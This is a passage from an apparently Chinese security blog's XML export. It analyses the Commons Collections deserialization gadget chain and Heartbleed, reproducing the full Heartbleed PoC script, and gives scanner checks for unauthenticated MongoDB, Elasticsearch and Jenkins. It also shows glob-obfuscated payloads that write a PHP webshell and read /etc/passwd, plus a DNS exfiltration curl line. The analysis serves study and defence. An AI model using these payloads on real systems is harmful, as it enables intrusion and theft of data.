methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7); &#125; &#125; &#125;&#125; 我们看下这个类，在transform方法中，我们看到了和基本漏洞相似的写法: 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); 是不是很熟悉，如果input、iMethodName、iParamTypes、iArgs都是由我们控制传入的话，是不是就可以像之前一样弹出计算器，很巧的是，在InvokerTransformer的构造方法中，可以传入其中的三个参数，transform的调用也可以传入1个，完美达成条件。我们来测试一下: 我们可以看到，是可以的，于是我们尝试去找谁调用了transform这个方法。在org.apache.commons.collections.map ==&gt; TransformedMap中找到3处: 12345678910protected Object transformKey(Object object) &#123; return this.keyTransformer == null ? object : this.keyTransformer.transform(object);&#125;protected Object transformValue(Object object) &#123; return this.valueTransformer == null ? object : this.valueTransformer.transform(object);&#125;protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value);&#125; 我们来仔细看下这个类。TransformedMap类实现了Map类的扩展，可以将两个实现了Transformer对象进行转换。首先是调用decorate方法初始化，decorate会调用构造方法进行实例化，对外暴露2个方法，put与putall分别用于传入一个或多个。如果原始不为null,则会调用this.[]Transformer.transform(object). 再来看下其他的两个类: ConstantTransformer的构造方法返回传入的值到iConstant ChainedTransformer这个类的构造方法传入多个transformer且其transform可以触发每个元素的transform方法 我们来看这个transform-chain，我们构造了一个Transformer[]，其内容如下: 1234567891011121314151617[0]iConstant = Runtime.class[1]iMethodName = "getMethod"iParamTypes = String.classiArgs = "getRuntime"[2]iMethodName = "invoke"iParamTypes = Object.classiArgs = "getRuntime"[3]iMethodName = "exec"iParamTypes = String.classiArgs = "open /Applications/Calculator.app/" 现在我们构造了一个chain，但是缺少一个触发chain.transform的途径从而往下传递触发。而我们在之前看到TransformedMap的checkSetValue可以触发transform方法,但checkSetValue无法直接调用，我们进一步看: 发现MapEntry可以直接调用setValue方法触发checkSetValue 所以整个的POC如下: 即构造了个TransformedMap然后对其第一个元素进行赋值。调用了setValue方法，触发了checkSetValue从而调用了ChainedTransformer的transform方法，从而对内部的4个Transform分别调用transform，从而完成了命令执行，但我们对细节还是一知半解，我们通过debug来一步步看下他执行的流程. 首先是transformers 的定义，为4个Transformer的数组，然后新建hashmap对象，并写入一个kv值 之后调用TransformedMap.decorate生成一个outerMap对象，outerMap.map是之前的hashmap, outerMap.keyTransformer为null,keyTransformer.valueTransformer是之前的chainedTransform elEntry 指向Map的第一个kv对 重点来了 之后我们看到，调用setValue会调用parent.checkSetValue,会返回valueTransformer.transform，而valueTransformer是之前的chainedTransform从而对每一个Transform对象都进行transform。 注意!ChainedTransformer的transform是链式的(这一点我到这里才注意到，也才想通整个过程)，即前一个的结果会作为参数传到下一个的transform方法中object = iTransformers[i].transform(object); 第一个ConstantTransformer的transform会返回java.lang.Runtime类 第二个InvokerTransformer之后返回Runtime.getRuntime()对象 第三个之后返回Runtime()对象 第三个则返回Runtime.getRuntime().getMethod(&quot;exec&quot;, String.class).invoke(,&quot;open.....&quot;)最终执行命令 以上就是核心的原理，那我我们如何利用呢？参考之前的的漏洞原理，我们需要找到一个接收Map类对象反序列化，且在readObject方法时调用Map对象的Entry的setValue方法. 所利用的类是AnnotationInvocationHandler，这个类无法直接访问(。。。一直以为是jdk的问题删掉了…哭晕)，可以直接去github上看源码，这里提供一个镜像链接。我们把它download下来看。 我们可以看到，当反序列化AnnotationInvocationHandler类时，其memberValues为我们传入的Map对象，在readObject会调用Map.Entry的setValue函数，从而触发漏洞: 完整payload如图，但这里本地无法成功，具体原因往下看。到这里我发现运行失败，而且无法进入AnnotationInvocationHandler里面单步调试，一开始我以为是oracle jdk与openjdk区别，下载了很多版本在idea中可以用Class.forName()调用但是就是无法import，也无法进入调试。由于不知道为什么错误也看不见具体逻辑，一度陷入僵局，而且网站的分析基本到给出payload就结束了。 于是采用一个骚操作，由于我们在镜像链接上可以看到，/sun/reflect/annotation/中有11个类，而我们在idea import sun.reflect.annotation中只能看到9个，唯独少了AnnotationInvocationHandler和AnnotationTypeMismatchExceptionProxy，且后者在前者中使用了，于是我打算把这两个类下载下来，作为我们本地类，这样就可以单步调试了。 注意，ExceptionProxy这个类只能在内部使用，我们把它注释掉就好，没有影响。一步步调试，一切如我们预期，在反序列化中，调用了AnnotationInvocationHandler类的readObject方法，一直到for循环中，如下图，在Class&lt;?&gt; memberType = memberTypes.get(name);中取得的值是value而我们之前HashMap的key是name导致不等没有进入setValue的过程。 这下就明白了，所以我们只需要更改innerMap.put(&quot;value&quot;, &quot;hello&quot;);，保证key是value即可成功执行命令: 当然代码可以改回sun.reflect.AnnotationInvocationHandler 我们再看下，为什么必须是value，annotationtype是注解类型，annotationType = AnnotationType.getInstance(type);的作用是返回@Target注解的内容，其memberTypes的key值为value，所以传入的内容也需要为value. 那么可以合理推测，我们将原始payload改成其他类型的注解，应该由于其memberTypes应该是表明其注解类型，应该也是value-&gt;...的Map形式，应该也可以成功执行，尝试后发现，符合我们预期，这样整个原理就算非常透彻的理解了。 漏洞修复 Apache Commons Collections在3.2.2版本中做了一定的安全处理，对这些不安全的Java类的序列化支持增加了开关，默认为关闭状态。涉及的类包括CloneTransformer,ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer, PrototypeCloneFactory,PrototypeSerializationFactory, WhileClosure。 我们可以看到，官方对于这种反序列化问题，往往采取的是黑名单，这也是之后为什么漏洞被频繁各种绕过，由于Apache Commons Collections当时存在于各种web server或容器中，导致当时各种组件被攻击。]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>java security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenSSL Heartbleed CVE-2014-0160]]></title>
    <url>%2Fblog%2FHeartbleed%2F</url>
    <content type="text"><![CDATA[The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs). The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users. 关于Heartbleed 的常见问题和描述，可以看The Heartbleed Bug ps.专门为了这个漏洞建了一个网站可以想象这个漏洞在当年多么严重。 接下来我们主要搞清楚这些具体都是什么含义 Heartbeat &amp; TCP keepalive首先是heartbeat，它是计算机中周期性发送的某些操作或同步的信号，常常用于检测或判断资源是否可用。 在默认情况下，在建立TCP连接之后，空闲时刻客户端和服务端不会互相发送数据包确认连接。假如有一端发生异常而掉线（如死机、防火墙拦截包、服务器爆炸），另一端若不进行连接确认，则会一直消耗资源。 为了保证连接的有效性，可以检测到对方端非正常的断开，我们通常利用两种机制来实现： 利用TCP协议的Keepalive 在应用层实现心跳检测Heartbeat TCP keepalive通过定时发送Keepalive探测包来探测连接的对端是否存活.在收到对端的确认报文后，设置keepalive timer。 当长时间两端无交互并且保活定时器超时的时候，本段会发送keepalive probe等待对端确认。若对端在一定时间内确认（具体的规则貌似比较繁琐），keepalive timer重置；否则，长时间未响应，连接终止。 TCP Keepalive默认是关闭的，因为它会消耗额外的资源，并且可能会关闭正常的连接。Linux 默认net.ipv4.tcp_keepalive_time为7200s TCP keepalive 与 HTTP keep-alive 前者探测连接是否存活 后者是让连接活的久一点 Heartbeat 应用层Heartbeat往往由自己编写 灵活且可复用，应用层心跳包不依赖于传输层协议，无论传输层协议是TCP还是UDP都可以用 应用层心跳包可以定制，可以应对更复杂的情况或传输一些额外信息 TCP keepalive仅代表连接保持着，而心跳包往往还代表客户端可正常工作 OpenSSLOpenSSL是一个开放源代码的软件库，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。这个库被广泛应用在互联网的网页服务器上。其主要库是以C语言所写成，实现了基本的加密功能，实现了SSL与TLS协议。关于SSL/TLS，可以参考我的这篇文章TLS/SSL流程详解 OpenSSL漏洞不仅影响以https开头的网站，攻击者还可利用此漏洞直接对个人电脑发起Heartbleed攻击 1OpenSSL在Web容器如Apache/Nginx中使用，这两的全球份额超过66%。还在邮件服务如SMTP/POP/IMAP协议中使用，聊天服务如XMPP协议，VPN服务等多种网络服务中广泛使用。可以看到，当时有多严重 漏洞影响 主要影响涉及开启了Heartbeat扩展的OpenSSL版本1.0.1f, 1.0.1e, 1.0.1d, 1.0.1c, 1.0.1b, 1.0.1a, 1.0.1 可以通过以下代码判断网页是否开启了SSL Heartbeat扩展 1openssl s_client -connect $website:443 -tlsextdebug 2&gt;&amp;1| grep 'TLS server extension "heartbeat"' 漏洞分析这次的漏洞属于SSL实现问题，协议本身没有问题。引用一张科普图来解释这个洞。 通俗的解释就是OpenSSL使用heartbeat探测对方主机是否在线，提供一个字符串和其长度，希望对方回应返回原样内容，但却未对长度与实际长度做验证，导致内存信息越界访问。由于可以不断尝试，返回的数据有可能是任何内容：用户请求密码，甚至是服务器私钥都有可能。 12345struct hb &#123; int type; int length; unsigned char *data; &#125;; 在存在问题的版本，其逻辑是这样的，假设hb上面上发过来心跳包结构，type是类型，length是data长度，*data是实际的内容，所以类型是1字节，长度是2字节，剩下的length字节是数据，我们找出openssl-1.0.1e的源码 1234567891011121314151617181920intdtls1_process_heartbeat(SSL *s) &#123; unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; /* Use minimum padding */// 定义变量并赋初值，p指向一条SSLv3的记录，结构如下:typedef struct ssl3_record_st &#123; int type; /* type of record */ unsigned int length; /* How many bytes available */ unsigned int off; /* read/write offset into 'buf' */ unsigned char *data; /* pointer to the record data */ unsigned char *input; /* where the decode bytes are */ unsigned char *comp; /* only used with decompression - malloc()ed */ unsigned long epoch; /* epoch number, needed by DTLS1 */ unsigned char seq_num[8]; /* sequence number, needed by DTLS1 */ &#125; SSL3_RECORD; 定义完之后: 1234/* Read type and payload length first */hbtype = *p++;n2s(p, payload);pl = p; 我们可以看到，首先hbtype取了p的第一个字节，n2s(p,payload)函数是将p指向的2个字节赋值给payload，然后再p+2, pl指向剩余的部分。 1234567891011121314151617181920212223242526272829303132333435363738if (s-&gt;msg_callback)...if (hbtype == TLS1_HB_REQUEST)&#123; unsigned char *buffer, *bp; int r; /* Allocate memory for the response, size is 1 byte * message type, plus 2 bytes payload length, plus * payload, plus padding */ buffer = OPENSSL_malloc(1 + 2 + payload + padding); bp = buffer; /* Enter response type, length and copy payload */ *bp++ = TLS1_HB_RESPONSE; s2n(payload, bp); memcpy(bp, pl, payload); bp += payload; /* Random padding */ RAND_pseudo_bytes(bp, padding); r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); if (r &gt;= 0 &amp;&amp; s-&gt;msg_callback) s-&gt;msg_callback(1, s-&gt;version, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding, s, s-&gt;msg_callback_arg); OPENSSL_free(buffer); if (r &lt; 0) return r; ...&#125;else if (hbtype == TLS1_HB_RESPONSE) ...&#125; 代码非常清晰(我这种不会c的都看得懂): 首先判断数据包类型，如果接收到的是心跳包，则处理 为其分配了1 + 2 + payload + padding字节的缓冲区，用于返回内容，记做buffer，bp指向同一位置 设置返回包数据类型TLS1_HB_RESPONSE，s2n同n2s用于赋值payload长度 然后从pl出复制了payload长度的内容给bp 之后给bp随机填充 我们可以看到，由于payload的是用户传递过来了，其并不一定等于实际消息内容，当payload值大于pl中实际剩余内容的长度时，就造成了漏洞，由于我们不知道pl后面内存中的内容，由于当时全网ssl还没有普及，一些关键部分使用ssl反而更加严重。(例如，账号密码，HTTP报头cookie) 我们可以分析，由于payload为2字节unsigned int，最大值为65525，即最多泄露64KB内容 补丁分析12345678/* Read type and payload length first */if (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length) return 0; /* silently discard */hbtype = *p++;n2s(p, payload);if (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length) return 0; /* silently discard per RFC 6520 sec. 4 */pl = p; 我们可以看到，相比于之前直接取2个字节给payload，其验证了长度和考虑的长度为0的情况，其余与原来的代码一致。 漏洞利用官方的POC如下，我们做一下分析: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#!/usr/bin/python# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.import sysimport structimport socketimport timeimport selectimport refrom optparse import OptionParseroptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')def h2bin(x): return x.replace(' ', '').replace('\n', '').decode('hex')hello = h2bin('''16 03 02 00 dc 01 00 00 d8 03 02 5343 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15 00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 0000 0f 00 01 01 ''')hb = h2bin('''18 03 02 00 0301 40 00''')def hexdump(s): for b in xrange(0, len(s), 16): lin = [c for c in s[b : b + 16]] hxdat = ' '.join('%02X' % ord(c) for c in lin) pdat = ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin) print ' %04x: %-48s %s' % (b, hxdat, pdat) printdef recvall(s, length, timeout=5): endtime = time.time() + timeout rdata = '' remain = length while remain &gt; 0: rtime = endtime - time.time() if rtime &lt; 0: return None r, w, e = select.select([s], [], [], 5) if s in r: data = s.recv(remain) # EOF? if not data: return None rdata += data remain -= len(data) return rdatadef recvmsg(s): hdr = recvall(s, 5) if hdr is None: print 'Unexpected EOF receiving record header - server closed connection' return None, None, None typ, ver, ln = struct.unpack('&gt;BHH', hdr) pay = recvall(s, ln, 10) if pay is None: print 'Unexpected EOF receiving record payload - server closed connection' return None, None, None print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)) return typ, ver, paydef hit_hb(s): s.send(hb) while True: typ, ver, pay = recvmsg(s) if typ is None: print 'No heartbeat response received, server likely not vulnerable' return False if typ == 24: print 'Received heartbeat response:' hexdump(pay) if len(pay) &gt; 3: print 'WARNING: server returned more data than it should - server is vulnerable!' else: print 'Server processed malformed heartbeat, but did not return any extra data.' return True if typ == 21: print 'Received alert:' hexdump(pay) print 'Server returned error, likely not vulnerable' return Falsedef main(): opts, args = options.parse_args() if len(args) &lt; 1: options.print_help() return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) print 'Connecting...' sys.stdout.flush() s.connect((args[0], opts.port)) print 'Sending Client Hello...' sys.stdout.flush() s.send(hello) print 'Waiting for Server Hello...' sys.stdout.flush() while True: typ, ver, pay = recvmsg(s) if typ == None: print 'Server closed connection without sending Server Hello.' return # Look for server hello done message. if typ == 22 and ord(pay[0]) == 0x0E: break print 'Sending heartbeat request...' sys.stdout.flush() s.send(hb) hit_hb(s)if __name__ == '__main__': main() 我们可以看到，先建立了socket连接，然后发了client Hello，hello的内容为那一群二进制，推测应该是SSL client Hello的内容，我们抓包看一下，具体的字段分析可以看之前的SSL文章，这里注意，扩展中开启了heartbeat: 直到收到(typ==22) 即 server hello类型的数据包，然后下一步。发送hb然后调用hit_hb，其中hb内容为我们构造的恶意heartbeat数据包 其中request message为01 40 00 分别对应: 123type = 01payload length = 0x40 00 = 16384data = null 这里只返回了16KB 的内容，极限是F0 00(64KB)]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>openssl</tag>
        <tag>vulnerability analysis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[未授权漏洞总结]]></title>
    <url>%2Fblog%2Funauthorized%2F</url>
    <content type="text"><![CDATA[这里总结了常见的未授权漏洞，都属于高危或严重漏洞，由于使用默认配置和root权限启动暴露在公网上，很容易被攻击甚至getshell，由于其原理非常简单，所以很容易被利用。例如，你的阿里云主机开redis，10分钟就有挖矿进程注入了，攻击者们都是对这些云服务提供商批量扫描的，所以在后面，我们也会放上poc，这些poc也集成在我们的RubScanner扫描器中。 Redis Memcached MongoDB Elasticsearch Jenkins Redis详见 Redis 未授权访问漏洞利用分析 Memcached详见 Memcached UDP DDoS利用复现 MongoDB MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。 其与MySQL等数据库类似，由于支持远程访问，而其默认不需要密码，导致一旦在公网暴漏，任何人都可以访问数据库，造成严重危害。POC非常简单，只需要尝试是否连接成功即可: 12345678910import pymongodef testMongoDB(ip, port=27017): try: conn = pymongo.MongoClient(ip,port,socketTimeoutMS=3000) dbname = conn.database_names() if dbname: return True except: return False Elasticsearch &amp; Kibana ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。Kibana是一个开源的分析与可视化平台，设计出来用于和Elasticsearch一起使用的。你可以用kibana搜索、查看、交互存放在Elasticsearch索引里的数据，使用各种不同的图表、表格、地图等kibana能够很轻易地展示高级数据分析与可视化。 es 和 kibana 均没有权限管理， 均可对日志进行搜索分析，危害非常大。 其中Kibana默认是可以看到所有表、字段等等，又是可视化界面，攻击者会乐哭的。 如下图，为从zoomeye搜索得到的，可以看到其所有日志表名和字段名: 1234567891011121314151617181920212223242526272829import requestsfrom urllib.parse import urljoinimport redef testElasticSearch(ip, port=9200): url1 = ip+':'+str(port) url2 = urljoin(ip+':'+str(port), '_cat') try: res1 = requests.get(url=url1, timeout=10) res2 = requests.get(url=url2, timeout=10) if re.match('You Know, for Search', res1.text, re.IGNORECASE) or '/_cat/master' in res2.text: return True else: return False except: return Falsedef testKibana(ip, port=5601): url1 = ip+':'+str(port) url2 = urljoin(ip+':'+str(port), 'app/kibana') try: res1 = requests.get(url=url1, timeout=10) res2 = requests.get(url=url2, timeout=10) if re.match('kibana', res1.text, re.IGNORECASE) or 'Loading Kibana' in res2.text or 'kibanaWelcomeView' in res2.text: return True else: return False except: return False Jenkins Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具，起源于Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行（这个比较抽象，暂且写上，不做解释）。Jenkins用Java语言编写，可在Tomcat等流行的servlet容器中运行，也可独立运行。 其基本信息(用户、队列)等信息是可以被直接访问的，script等脚本执行不一定可以被执行(没有runscript权限)。 123456789def testJenkins(ip, port=8080): url = urljoin(ip+':'+str(port), 'script') try: res = requests.get(url, timeout=10) if re.match('Authentication required', res.text, re.IGNORECASE): return False return True except: return False]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>unauthorized</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 通配符 绕过WAF]]></title>
    <url>%2Fblog%2Flinux-wildcard%2F</url>
    <content type="text"><![CDATA[最近发现了一个技巧，在命令执行漏洞时，会非常有用，就是Linux 的通配符。我们常用通配符去搜索、查找、匹配文件内容，但linux shell有glob模式，其可以使用通配符去匹配命令 1234567891011121314151617181920字符 解释* 匹配任意长度任意字符? 匹配任意单个字符[list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合[^list] 匹配指定范围外的任意单个字符或字符集合[!list] 同[^list]&#123;str1,str2,...&#125; 匹配 srt1 或者 srt2 或者更多字符串，也可以是集合专用字符集字符意义[:alnum:] 任意数字或者字母[:alpha:] 任意字母[:space:] 空格[:lower:] 小写字母[:digit:] 任意数字[:upper:] 任意大写字母[:cntrl:] 控制符[:graph:] 图形[:print:] 可打印字符[:punct:] 标点符号[:xdigit:] 十六进制数[:blank:] 空白字符 例如cat 命令可以被替换成如下: 1234/???/????/ifconfig/???/????/if[a-z]onfig/???/????/if[a-z]on[[:alnum:]]ig/???/????/i??????g | grep inet 很多基于正则表达式或者关键字的WAF是无法检测出这种类型的注入的。当然，要保证/???/????/i??????g这种是唯一的，可以用TAB来查找观察是否命令唯一，同时，这种情况命令必须是绝对路径。 知道了这个原理，我们可以将我们以后所有的payload都进行改造: 1234567[webshell]http://a.com?cmd=/???/e??? "&lt;?php eval($_POST['cmd'])?&gt;" &gt; 1.php[读取passwd内容]cmd=/???/ca? /???/p?????其余的可自行修改]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS 协议 & DNS 常见攻击]]></title>
    <url>%2Fblog%2Fdns-hijack%2F</url>
    <content type="text"><![CDATA[DNS(Domain Name System)域名系统作为互联网上最为重要的基础服务，由于其依赖的协议本身，同时也是最为脆弱的一环。常见对于DNS服务的攻击有: DDoS DNS缓存投毒 中间人劫持 由DNS协议缺乏必要的认证机制，客户无法确认接收到的信息的真实性和权威性，基于名字的认证过程并不能起到真正的识别作用，而且接收到的应答报文中往往含有额外的附加信息，其正确性也无法判断。此外，DNS 的绝大部分通信使用 UDP，数据报文容易丢失，也易于受到劫持和欺骗。 DNS协议 DNS 标准查询内容抓包如下，可以看到还是比较简单的，对于DNS的字段总结如下： A记录 实现 domain name =&gt; IP addr 12345678910nslookup -querytype=a hellohxk.comServer: 202.117.112.3Address: 202.117.112.3#53Non-authoritative answer:Name: hellohxk.comAddress: 103.72.145.7Non-authoritative answer: 它的出现代表这个结果是从服务器的缓存中得到的，这不是一个授权的答案。 如果同一个域名指向多个A记录 每次返回的数据包含了两个IP地址，但是在返回的过程中数据排列的顺序每次都不相同。 由于大部分的客户端只选择第一条记录所以通过这种方式可以实现一定程度的负载均衡。 MX记录 实现 Mail服务 12345678nslookup -querytype=mx hellohxk.comServer: 202.117.112.3Address: 202.117.112.3#53Non-authoritative answer:hellohxk.com mail exchanger = 10 mxw.mxhichina.com.hellohxk.com mail exchanger = 5 mxn.mxhichina.com. 即在给mail@xx.com发邮件时，会去进行域名解析，查找MX记录。 先找权重数最小的服务器（比如说是 10），如果能连通，那么就将服务器发送过去；如果无法连通 mx记录为10 的服务器，那么才将邮件发送到权重为20的 mail 服务器上。 权重20的服务器在配置上只是暂时缓存mail ，当权重20的服务器能连通权重为10的服务器时，仍会将邮件发送的权重为10的 Mail 服务器上。当然，这个机制需要在 Mail 服务器上配置。 CNAME记录 实现 域名别称的作用 123456nslookup -querytype=cname www.meishichina.comServer: 202.117.112.3Address: 202.117.112.3#53Non-authoritative answer:www.meishichina.com canonical name = www.meishichina.com.w.kunlunar.com. 当我们要指向很多的域名到一台电脑上的时候，用CNAME比较方便，这样查出来的不一定是真正的信息，比如baidu查出来就是a.shifen.com是baidu的安全外壳。 TXT记录 实现 某条记录设置说明 1nslookup -qt=txt example.com 如果设置了内容，就会看到结果 AAAA 记录 指向 IPv6地址 NS记录 指向 用哪台DNS服务器进行解析 TTL值 表示 解析记录在DNS服务器中的缓存时间, 利用这个值可以实现DNS rebinding，具体利用可以参考这里 常见DNS攻击&amp;利用DNS DDoS DNS FLood 向目标DNS服务器发送大量DNS查询请求，导致网络带宽耗尽而无法传送正常DNS查询请求 针对授权域服务器DRDoS 发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的 DNS 反射 由于DNS查询基于UDP协议，而UDP查询返回的内容是查询内容大小的10倍以上，所以构成了反射的条件，伪造DNS查询的ip地址，而由于一般主机不会过滤来自53端口发送的数据包，从而造成DNS反射攻击 DNS缓存污染首先介绍下常见系统/软件查看DNS缓存的方法: 12345678[windows]ipconfig /displaydns[chrome]chrome://net-internals/#dns[linux]如果启用了nscd或者BIND才会有缓存[MAC]mDNSResponder DNS 缓存污染指的是从权威域名服务器返回的 IP 地址在传递给最终用户的过程中被篡改了。由于查询结果要返回给最终用户需要经过很多系统，有很多地方都是可以篡改结果内容的，例如一台在你 ISP 范围内被动了手脚的路由器，一个通道中透明的 DNS 服务器，甚至可能是最终用户电脑上的病毒或木马 最常见的长城防火墙中就使用了DNS 缓存污染，所有试图访问某些域名的DNS请求，一旦被发现，会伪造成DNS服务器向用户返回无效IP地址。 DNS劫持攻击者监听DNS会话，猜测DNS服务器响应ID，抢先将虚假的响应提交给客户端 DNS重定向将DNS名称查询重定向到恶意DNS服务器，可以从以下的例子中看出 # ettercap DNS spoof可以使用ettercap进行简单的DNS欺骗实验，在kali 上开一个简单的web服务器，然后修改etc/ettercap/etter.dns文件，添加以下内容: 1www.qwer.com A 192.168.1.100 选择一个不常用域名的原因是网卡的问题，网关的限制，还有DNS缓存等多种因素，劫持是并不一定可以生效，所以选择一个比较偏僻的域名，这样可以排除缓存干扰。在选择的插件中，开启DNS Spoof，在测试机中访问www.qwer.com,发现如下:发现成功访问了搭建的web服务器，说明劫持成功 DNS隧道(DNS Tunneling)即利用DNS协议请求时，在请求报文上附带所传递的信息，最简单的我去对payload.xxx.com进行DNS解析，这时我的xxx.com的DNS解析服务器就能够收到一条Query，从而提取出payload内容。以ceye.io为例: 1curl password.4iew70.ceye.io 假设curl包被防火墙过滤了，但DNS请求没有被过滤，我们的服务器上就会收到DNS Standard Query，如下： DNS系统漏洞 BIND(Berkeley Internet Name Domain)是最常用的DNS服务软件，具有广泛的使用基础，Internet上的绝大多数DNS服务器都是基于这个软件的。BIND提供高效服务的同时也存在着众多的安全性漏洞。，CNCERT/CC在2009年安全报告中指出：2009年7月底被披露的”Bind9″高危漏洞，影响波及全球数万台域名解析服务器，我国有数千台政府和重要信息系统部门、基础电信运营企业以及域名注册管理和服务机构的域名解析服务器受到影响。 DNS信息泄露DNS Zone TransferDNS域传送漏洞可以造成大量DNS子域名遭到泄露 DNS域传送，其利用的是DNS服务器的冗余设计造成的缺陷,即备用服务器使用来自主服务器的数据刷新自己的域数据库，防止服务器故障时无法提供解析服务。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送. 例如使用以下命令可以检测是否存在DNS域传送漏洞： 1dig @ns4.isp.com example.com axfr]]></content>
      <categories>
        <category>DNS</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>DNS hijack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TLS/SSL流程详解 & HTTPS中间人攻击 & 流量分析SSL题目]]></title>
    <url>%2Fblog%2Fssl%2F</url>
    <content type="text"><![CDATA[TLS/SSLSSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS/SSL在传输层对网络连接进行加密。常见的HTTP、FTP由于采用明文传输，所以可以使用SSL进行数据传输加密。SSL分为两个部分：handshake和application data两个阶段，后者使用前者协商的对称密钥加密数据，前者的流程图如下： TLS/SSL使用非对称加密提供身份认证和密钥协商(RSA、DH、ECC)，使用对称加密完成信息加密(AES、DES、RC4)，使用散列算法提供完整校验(MD5、SHA) 整个流程分为5个部分： 流程 详细内容 1.client hello client发送client hello类型包，其中包括TLS版本，随机数random_c，session id,支持的密码套件cipher suite、支持的压缩算法、扩展字段 2.server hello server发送server hello包,其中包括协议版本，随机数random_s,session id,选择的密码套件cipher suite,选择的压缩算法，选择的扩展 3.certificate 发送证书信息 (server key exchange) 有些算法例如DH会发送这一步用于交换密钥 4.server hello done hello done 标志 5.client key Exchange,change cipher spec,encypted handshake message 分为3个部分，client key exchange用于对称密钥第三部分per-master部分的生成，changecipherspec指从现在开始数据是加密的，encrypted handshake message使用生成的密钥进行加密通信参数 6.server ChangeCipherSpec 表示服务器从现在开始发送加密信息 7.server encrypted handshake message 服务器发送也结合所有当前的通信参数信息生成一段数据 下面我们根据抓包内容对每一个步骤进行详细说明: Client Hello 可以看见，发送的内容有：TLS版本，handshake type, 